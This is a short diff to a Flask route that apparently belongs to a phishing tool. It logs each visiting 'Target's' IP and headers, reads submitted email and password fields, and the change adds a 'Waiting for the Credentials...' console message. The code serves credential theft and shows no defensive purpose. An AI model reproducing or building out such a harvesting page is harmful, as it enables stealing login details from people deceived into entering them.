@@ -8,6 +8,7 @@ def index():
 	ip = request.remote_addr
 	headers = request.headers
 	print(f"\n{colored('Target Visited to the URL', 'green')}\n\nHeaders : \n{headers}")
+	print(f"{colored('Waiting for the Credentials...', 'green')}\n")
 	if request.method=='POST':
 		email = request.form.get('email')
 		password = request.form.get('password')
